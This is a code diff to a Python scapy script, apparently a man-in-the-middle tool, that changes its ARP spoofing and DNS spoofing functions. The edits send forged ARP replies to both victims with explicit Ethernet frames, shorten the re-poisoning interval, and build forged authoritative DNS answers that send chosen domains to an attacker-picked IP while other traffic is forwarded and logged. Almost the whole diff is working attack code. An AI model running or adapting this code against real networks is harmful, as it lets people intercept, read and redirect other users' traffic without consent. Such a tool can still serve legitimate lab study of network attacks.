@@ -4,6 +4,8 @@ import threading
 import time
 from scapy.all import IP, Ether, send, sniff, getmacbyip, conf, get_if_hwaddr, ARP, sendp, TCP, UDP, ICMP, DNS, DNSQR, DNSRR, get_if_addr
 import copy
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import socket
 
 targets = dict()
 targets_lock = threading.Lock()
@@ -18,7 +20,7 @@ attacker_ip = get_if_addr(conf.iface)
 # TODO: How long will the key value pairs stored in here hold? When are they expired and should we check again?
 mac_cache = {}  # Cache to store resolved IP-MAC pairs
 
-spoof_cooldown_in_sec = 3
+spoof_cooldown_in_sec = 1
 
 
 def get_right_order(val1: str, val2: str):
@@ -72,41 +74,34 @@ def handle_incoming_packet(packet):
             domain = packet[DNSQR].qname
             with dns_targets_lock:
                 is_domain_in_targets = domain.decode().rstrip('.').lower() in dns_targets
+                redirect_ip = dns_targets.get(domain.decode().rstrip('.').lower())
             if is_domain_in_targets:
-                dns_spoof(packet, domain)
+                dns_spoof(packet, redirect_ip)
+            else:
+                redirect_packet(dst_mac, packet)
         else:
             redirect_packet(dst_mac, packet)
 
-        if packet.haslayer(DNS):
-            print_packet_in_json(packet)
+        print_packet_in_json(packet)
 
 
-def dns_spoof(packet, domain):
-    with dns_targets_lock:
-        redirect_ip = dns_targets.get(domain.decode().rstrip('.').lower())
-    if redirect_ip is None:
-        return
+def dns_spoof(packet, redirect_ip):
+    domain = packet[DNSQR].qname
+    ether = Ether(src=attacker_mac, dst=packet[Ether].src)
 
-    ether = Ether(
-        src=attacker_mac.lower(),
-        dst=packet[Ether].src
-    )
-    ip = IP(src=packet[IP].dst,
-            dst=packet[IP].src)
+    ip = IP(src=packet[IP].dst, dst=packet[IP].src, ttl=64)
     udp = UDP(sport=53, dport=packet[UDP].sport)
+
     dns = DNS(
         id=packet[DNS].id,
-        qr=1, aa=1, qdcount=1, qd=packet[DNS].qd,
-        ancount=1,
-        an=DNSRR(
-            rrname=domain,
-            ttl=300,
-            rdata=redirect_ip
-        )
+        qr=1, aa=1, ra=1,
+        qd=packet[DNS].qd,
+        an=DNSRR(rrname=domain, ttl=300, rdata=redirect_ip),
+        ancount=1
     )
 
-    forged = ether / ip / udp / dns
-    sendp(forged, iface=conf.iface, verbose=False)
+    del ip.len, ip.chksum, udp.len, udp.chksum
+    sendp(ether/ip/udp/dns, iface=conf.iface, verbose=False)
 
 
 # Creates a new packet with the attacker's mac address
@@ -160,15 +155,13 @@ def spoof(ip1, ip2):
         log_error(f"Failed to spoof {ip1} and {ip2} because one or more mac address could not be resolved")
         return
 
-    # Create the ARP spoof packet
-    packet = ARP(op=2, pdst=ip1, psrc=ip2, hwsrc=attacker_mac, hwdst=mac1)
+    arp1 = ARP(op=2, pdst=ip1, psrc=ip2, hwsrc=attacker_mac, hwdst=mac1)
+    ether1 = Ether(dst=mac1, src=attacker_mac)
+    sendp(ether1/arp1, iface=conf.iface, verbose=False)
 
-    # Send the spoofed packet
-    send(packet, verbose=False)
-
-    # Also spoof in the opposite direction
-    packet = ARP(op=2, pdst=ip2, psrc=ip1, hwsrc=attacker_mac, hwdst=mac2)
-    send(packet, verbose=False)
+    arp2 = ARP(op=2, pdst=ip2, psrc=ip1, hwsrc=attacker_mac, hwdst=mac2)
+    ether2 = Ether(dst=mac2, src=attacker_mac)
+    sendp(ether2/arp2, iface=conf.iface, verbose=False)
 
 
 # Constantly sniff packets and pass them to the send_packet_info() function
